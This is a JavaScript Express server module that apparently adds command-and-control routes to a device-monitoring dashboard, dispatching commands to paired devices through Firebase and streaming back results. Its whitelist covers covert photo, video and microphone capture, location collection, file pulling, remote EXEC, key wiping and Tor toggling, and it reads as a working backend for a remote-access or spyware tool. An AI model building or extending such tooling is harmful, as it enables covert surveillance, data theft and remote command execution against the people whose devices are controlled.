// Extended dashboard <-> device surface. Everything in this file is additive to
// the v3.1.0 server/index.js — mount these routes alongside the existing ones.

import { db } from '../lib/firebase.js'
import rateLimit from 'express-rate-limit'

const EXTENDED_WHITELIST = [
  // original
  'SYNC_NOW', 'FORCE_COLLECT', 'COLLECT_LOCATION',
  'UPDATE_INTERVAL', 'UPDATE_SYNC_INTERVAL', 'UPDATE_LOCATION_INTERVAL',
  // new
  'SNAP', 'RECORD_VIDEO', 'RECORD_AUDIO', 'PROBE_MIC',
  'PULL_FILE', 'LIST_APPS', 'EXEC', 'PANIC', 'WIPE_KEYS',
  'TOGGLE_COLLECTOR', 'SET_CONFIG', 'GET_CONFIG', 'PING',
  'ENABLE_TOR', 'DISABLE_TOR'
]

export function registerExtended(app, deps) {
  const { verifyUser, sanitizeDeviceId } = deps

  const cmdLimiter = rateLimit({
    windowMs: 60_000,
    max: 30,
    keyGenerator: (req) => req.uid || req.ip,
    standardHeaders: false,
    legacyHeaders: false
  })

  // Single generic dispatcher — supports the entire whitelist.
  app.post('/api/v2/devices/:deviceId/cmd', verifyUser, cmdLimiter, async (req, res) => {
    try {
      const deviceId = sanitizeDeviceId(req.params.deviceId)
      if (!deviceId) return res.status(400).json({ error: 'invalid deviceId' })
      const access = await db.ref(`users/${req.uid}/devices/${deviceId}`).once('value')
      if (!access.exists()) return res.status(403).json({ error: 'no access' })

      const cmd = req.body || {}
      if (!EXTENDED_WHITELIST.includes(cmd.type)) return res.status(400).json({ error: 'unknown command', allowed: EXTENDED_WHITELIST })

      const payload = {
        type: cmd.type,
        timestamp: Date.now(),
        params: cmd.params || {}
      }
      // Special-case the intervals to keep the wire format compatible with
      // the v3.1.0 app (the app reads `interval_minutes`, not `params.interval`).
      if (cmd.type === 'UPDATE_INTERVAL' || cmd.type === 'UPDATE_SYNC_INTERVAL' || cmd.type === 'UPDATE_LOCATION_INTERVAL') {
        if (typeof cmd.interval_minutes === 'number') payload.interval_minutes = cmd.interval_minutes
      }
      await db.ref(`devices/${deviceId}/commands`).set(payload)
      res.json({ success: true, command: payload })
    } catch (e) {
      console.error('extended cmd:', e.message)
      res.status(500).json({ error: 'internal' })
    }
  })

  // Command result inbox: the app posts back a small { type, ok, ... } doc
  // that we store under `devices/<id>/command_results/<ts>` for the dashboard.
  // The dashboard subscribes via /api/v2/devices/:id/results (SSE) and via the
  // /results REST history endpoint.
  app.post('/api/v2/devices/:deviceId/result', async (req, res) => {
    try {
      const deviceId = sanitizeDeviceId(req.params.deviceId)
      if (!deviceId) return res.status(400).json({ error: 'invalid deviceId' })
      const snap = await db.ref(`devices/${deviceId}/pairedTo`).once('value')
      if (!snap.exists()) return res.status(403).json({ error: 'not paired' })
      const ts = Date.now()
      const result = { ts, ...(req.body || {}) }
      await db.ref(`devices/${deviceId}/command_results/${ts}`).set(result)
      // bounded: cap at 200 latest results
      const all = await db.ref(`devices/${deviceId}/command_results`).once('value')
      const keys = Object.keys(all.val() || {}).sort()
      if (keys.length > 200) {
        const drop = Object.fromEntries(keys.slice(0, keys.length - 200).map((k) => [k, null]))
        await db.ref(`devices/${deviceId}/command_results`).update(drop)
      }
      res.json({ success: true })
    } catch (e) { res.status(500).json({ error: 'internal' }) }
  })

  app.get('/api/v2/devices/:deviceId/results', verifyUser, async (req, res) => {
    try {
      const deviceId = sanitizeDeviceId(req.params.deviceId)
      if (!deviceId) return res.status(400).json({ error: 'invalid deviceId' })
      const access = await db.ref(`users/${req.uid}/devices/${deviceId}`).once('value')
      if (!access.exists()) return res.status(403).json({ error: 'no access' })
      const snap = await db.ref(`devices/${deviceId}/command_results`).once('value')
      const v = snap.val() || {}
      const arr = Object.entries(v).map(([ts, r]) => ({ ts: Number(ts), ...r })).sort((a, b) => b.ts - a.ts).slice(0, 200)
      res.json({ success: true, results: arr })
    } catch (e) { res.status(500).json({ error: 'internal' }) }
  })

  // Server-Sent Events stream of command results. One connection per device.
  // The dashboard opens this on the device detail page; we tail the RTDB
  // command_results child and push new entries to the client.
  app.get('/api/v2/devices/:deviceId/live', verifyUser, async (req, res) => {
    const deviceId = sanitizeDeviceId(req.params.deviceId)
    if (!deviceId) return res.status(400).end()
    const access = await db.ref(`users/${req.uid}/devices/${deviceId}`).once('value')
    if (!access.exists()) return res.status(403).end()

    res.set({
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache, no-transform',
      'Connection': 'keep-alive',
      'X-Accel-Buffering': 'no'
    })
    res.flushHeaders?.()
    res.write(`event: hello\ndata: ${JSON.stringify({ deviceId, ts: Date.now() })}\n\n`)

    const since = Date.now()
    const ref = db.ref(`devices/${deviceId}/command_results`)
    const handler = ref.orderByChild('ts').startAt(since).on('child_added', (s) => {
      const v = s.val()
      if (!v) return
      res.write(`event: result\ndata: ${JSON.stringify(v)}\n\n`)
    }, (err) => {
      res.write(`event: error\ndata: ${JSON.stringify({ error: err?.message || 'listener failed' })}\n\n`)
    })

    const ka = setInterval(() => { res.write(':keepalive\n\n') }, 15_000)
    req.on('close', () => {
      clearInterval(ka)
      ref.orderByChild('ts').startAt(since).off('child_added', handler)
    })
  })
}
